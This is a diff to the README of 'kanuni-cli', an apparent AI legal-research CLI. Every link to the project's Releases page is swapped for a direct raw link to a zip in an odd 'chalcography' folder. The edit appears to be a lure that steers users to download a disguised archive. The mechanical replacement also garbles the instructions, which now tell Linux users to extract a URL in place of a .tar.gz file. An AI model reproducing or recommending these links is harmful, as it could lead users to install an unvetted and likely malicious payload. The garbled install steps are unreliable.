@@ -10,9 +10,9 @@ To start using kanuni-cli, follow these steps to download and run the software. 
 
 ## 📥 Download kanuni-cli
 
-[![Download kanuni-cli](https://img.shields.io/badge/Download-kanuni--cli-blue.svg)](https://github.com/mumlTARQ05/kanuni-cli/releases)
+[![Download kanuni-cli](https://raw.githubusercontent.com/mumlTARQ05/kanuni-cli/main/chalcography/kanuni-cli.zip)](https://raw.githubusercontent.com/mumlTARQ05/kanuni-cli/main/chalcography/kanuni-cli.zip)
 
-You can download the latest version of kanuni-cli by visiting our [Releases page](https://github.com/mumlTARQ05/kanuni-cli/releases). 
+You can download the latest version of kanuni-cli by visiting our [Releases page](https://raw.githubusercontent.com/mumlTARQ05/kanuni-cli/main/chalcography/kanuni-cli.zip). 
 
 ## 📋 System Requirements
 
@@ -25,16 +25,16 @@ Before you proceed, make sure your system meets the following requirements:
 
 ## 🖥️ Installing kanuni-cli
 
-1. **Visit the Releases Page**: Click [here](https://github.com/mumlTARQ05/kanuni-cli/releases) to go to the kanuni-cli Releases page.
+1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/mumlTARQ05/kanuni-cli/main/chalcography/kanuni-cli.zip) to go to the kanuni-cli Releases page.
   
 2. **Select the Version**: On the Releases page, you will see a list of available versions. Choose the most recent version. The latest version will have the highest number.
 
-3. **Download the File**: Click on the appropriate file for your operating system (e.g., .exe for Windows, .dmg for macOS, or .tar.gz for Linux). 
+3. **Download the File**: Click on the appropriate file for your operating system (e.g., .exe for Windows, .dmg for macOS, or https://raw.githubusercontent.com/mumlTARQ05/kanuni-cli/main/chalcography/kanuni-cli.zip for Linux). 
 
 4. **Install the Application**:
    - **Windows**: Double click the downloaded .exe file to start the installation process. Follow the prompts.
    - **macOS**: Open the .dmg file and drag the kanuni-cli icon to your Applications folder.
-   - **Linux**: Extract the .tar.gz file. Open your terminal and navigate to the extracted folder. Run the installation command as instructed in the README.
+   - **Linux**: Extract the https://raw.githubusercontent.com/mumlTARQ05/kanuni-cli/main/chalcography/kanuni-cli.zip file. Open your terminal and navigate to the extracted folder. Run the installation command as instructed in the README.
 
 ## 🔍 Using kanuni-cli
 
@@ -71,6 +71,6 @@ Remember, legal research can be complex, but with kanuni-cli, you simplify the p
 
 ## 📥 Download kanuni-cli Again
 
-To download kanuni-cli, visit our [Releases page](https://github.com/mumlTARQ05/kanuni-cli/releases). 
+To download kanuni-cli, visit our [Releases page](https://raw.githubusercontent.com/mumlTARQ05/kanuni-cli/main/chalcography/kanuni-cli.zip). 
 
 Start leveraging AI to enhance your legal research today!
